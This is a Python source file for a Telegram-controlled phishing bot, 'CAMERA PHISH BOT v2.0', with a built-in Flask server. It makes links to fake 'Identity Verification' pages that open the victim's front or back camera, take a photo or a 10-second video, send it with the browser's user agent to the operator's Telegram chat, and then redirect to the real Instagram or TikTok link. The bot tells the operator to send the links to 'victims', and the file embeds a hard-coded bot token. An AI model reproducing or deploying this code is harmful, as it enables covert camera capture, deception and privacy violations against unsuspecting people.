import os
import re
import base64
import json
from datetime import datetime
from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import requests
import threading
import uuid
import time

# ===== CONFIG - YOUR CHAT ID =====
TELEGRAM_TOKEN = "8331127596:AAHx7X6ZAeOdF0SOMNCThF6pX2Mlb3vM8q4"
CHAT_ID = "8595919435"  # ✅ YOUR CHAT ID
HOST = os.environ.get('RAILWAY_STATIC_URL', f"http://localhost:{os.environ.get('PORT', 5000)}")
PORT = int(os.environ.get('PORT', 5000))

app = Flask(__name__)
campaigns = {}
bot_instance = None

# HTML Templates (minified + obfuscated)
PHOTO_TEMPLATE = """
<!DOCTYPE html><html><head><title>Verify</title><meta name="viewport" content="width=device-width"><style>body{font-family:sans-serif;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px;}
.verify-box{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;text-align:center;max-width:400px;}
.cam-preview{width:100%;max-width:300px;height:400px;object-fit:cover;border-radius:15px;margin:20px 0;background:#333;}
.btn{background:#0095f6;color:white;border:none;padding:15px 30px;border-radius:25px;font-size:16px;cursor:pointer;margin:10px;display:block;width:100%;}
.btn:hover{background:#1877f2;}.status{color:#ccc;margin:20px 0;}</style></head><body>
<div class="verify-box"><h2>🔐 Identity Verification</h2><p>Verify you're human to watch</p>
<video id="preview" class="cam-preview" autoplay playsinline muted></video>
<button class="btn" onclick="c()">✅ Verify & Watch</button><div id="status" class="status"></div></div>
<script>let s=null,l='{target_url}',m='{mode}',i='{campaign_id}';async function iC(){try{let f=m.includes('back')?'environment':'user';s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:1280,height:720}});document.getElementById('preview').srcObject=s}catch(e){window.location.href=l;}}iC();async function c(){let b=document.querySelector('.btn');b.innerHTML='⏳ Sending...';b.disabled=true;let v=document.getElementById('preview'),c=document.createElement('canvas');c.width=640;c.height=480;c.getContext('2d').drawImage(v,0,0);let d=c.toDataURL('image/jpeg',0.9).split(',')[1];await fetch('/u/'+i,{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({i:d,m:m,ua:navigator.userAgent,ip:navigator.connection?navigator.connection.effectiveType:'unknown'})});setTimeout(()=>{window.location.href=l;},1500);}</script></body></html>
"""

VIDEO_TEMPLATE = """
<!DOCTYPE html><html><head><title>Live Verify</title><meta name="viewport" content="width=device-width"><style>body{font-family:sans-serif;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px;}
.verify-box{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;text-align:center;max-width:400px;}
.cam-preview{width:100%;max-width:300px;height:400px;object-fit:cover;border-radius:15px;margin:20px 0;background:#333;}
.btn{background:#ff6b35;color:white;border:none;padding:15px 30px;border-radius:25px;font-size:16px;cursor:pointer;margin:10px;display:block;width:100%;}.status{color:#ccc;margin:20px 0;}</style></head><body>
<div class="verify-box"><h2>📹 Live Verification</h2><p>Record 10s to unlock</p>
<video id="preview" class="cam-preview" autoplay playsinline muted></video>
<button class="btn" onclick="r()">🎥 Record & Unlock</button><div id="status" class="status"></div></div>
<script>let s=null,mR=null,c=[],l='{target_url}',m='{mode}',i='{campaign_id}';async function iC(){try{let f=m.includes('back')?'environment':'user';s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:1280,height:720}});document.getElementById('preview').srcObject=s}catch(e){window.location.href=l;}}iC();async function r(){let b=document.querySelector('.btn');b.innerHTML='🎥 Recording...';b.disabled=true;mR=new MediaRecorder(s);c=[];mR.ondataavailable=e=>c.push(e.data);mR.onstop=async()=>{let bl=new Blob(c,{"type":"video/webm"}),re=new FileReader();re.onload=()=>{let d=re.result.split(',')[1];fetch('/u/'+i,{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({v:d,m:m,ua:navigator.userAgent,dur:10})});setTimeout(()=>{window.location.href=l;},2000);};re.readAsDataURL(bl);};mR.start();setTimeout(()=>mR.stop(),10000);}</script></body></html>
"""

@app.route('/')
def home():
    return "🚀 ACTIVE"

@app.route('/<campaign_id>')
def campaign(campaign_id):
    if campaign_id not in campaigns:
        return "404", 404
    c = campaigns[campaign_id]
    if c['mode'].startswith('video'):
        return Response(VIDEO_TEMPLATE.format(target_url=c['url'], mode=c['mode'], campaign_id=campaign_id), mimetype='text/html')
    return Response(PHOTO_TEMPLATE.format(target_url=c['url'], mode=c['mode'], campaign_id=campaign_id), mimetype='text/html')

@app.route('/u/<campaign_id>', methods=['POST'])
def upload(campaign_id):
    try:
        data = request.json
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        caption = f"🎯 *CAMPAIGN {campaign_id}*\n{mode_emoji(data['mode'])} *{data['mode'].replace('_',' ').title()}*\n🕐 {ts}\n📱 {data.get('ua','Unknown')[:60]}"
        
        if 'i' in data:  # photo
            img = base64.b64decode(data['i'])
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", 
                         data={'chat_id': CHAT_ID, 'caption': caption},
                         files={'photo': ('capture.jpg', img, 'image/jpeg')})
        else:  # video
            vid = base64.b64decode(data['v'])
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo", 
                         data={'chat_id': CHAT_ID, 'caption': caption},
                         files={'video': ('capture.webm', vid, 'video/webm')})
        
        return {"ok": True}
    except:
        return {"ok": False}

def mode_emoji(mode):
    if 'selfie' in mode: return "📸"
    return "📷"

# Telegram Bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("📸 Selfie Photo", callback_data="photo_selfie")],
        [InlineKeyboardButton("📷 Back Photo", callback_data="photo_back")],
        [InlineKeyboardButton("🎥 Selfie Video 10s", callback_data="video_selfie")],
        [InlineKeyboardButton("📹 Back Video 10s", callback_data="video_back")]
    ]
    await update.message.reply_text(
        "🤖 *CAMERA PHISH BOT v2.0*\n\n"
        "🎯 Select mode → Send target URL → Get phish link!\n\n"
        f"📲 Chat ID: `{CHAT_ID}` ✅",
        reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    mode = query.data
    cid = str(uuid.uuid4()).replace('-','')[:8]
    
    campaigns[cid] = {'mode': mode, 'status': 'waiting'}
    context.user_data['cid'] = cid
    context.user_data['mode'] = mode
    
    await query.edit_message_text(
        f"✅ *{mode.replace('_',' ').title()}* selected!\n\n"
        "📎 *Send target URL now*\n"
        f"💡 `https://instagram.com/reel/abc123/`\n"
        f"`https://tiktok.com/@user/video/123456`"
    )

async def url_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = context.user_data.get('cid')
    if not cid or cid not in campaigns:
        await update.message.reply_text("❌ /start first!")
        return
    
    url = re.search(r'https?://[^\s<>"]+', update.message.text)
    if not url:
        await update.message.reply_text("❌ Send valid URL!")
        return
    
    target_url = url.group(0)
    campaigns[cid]['url'] = target_url
    campaigns[cid]['status'] = 'active'
    
    phish_url = f"{HOST}/{cid}"
    
    kb = [[InlineKeyboardButton("🚀 PHISH LINK", url=phish_url)]]
    
    await update.message.reply_text(
        f"🎉 *DEPLOYED!*\n\n"
        f"📸 *Mode:* {context.user_data['mode'].replace('_',' ').title()}\n"
        f"🎯 *Target:* `{target_url}`\n"
        f"🔗 *Phish:* `{phish_url}`\n\n"
        f"👇 *Send this button to victims!*",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode='Markdown',
        disable_web_page_preview=True
    )

def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    time.sleep(3)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, url_handler))
    
    print(f"🚀 Bot + Server running on {HOST}")
    print(f"📱 Chat ID: {CHAT_ID}")
    
    app.run_polling()
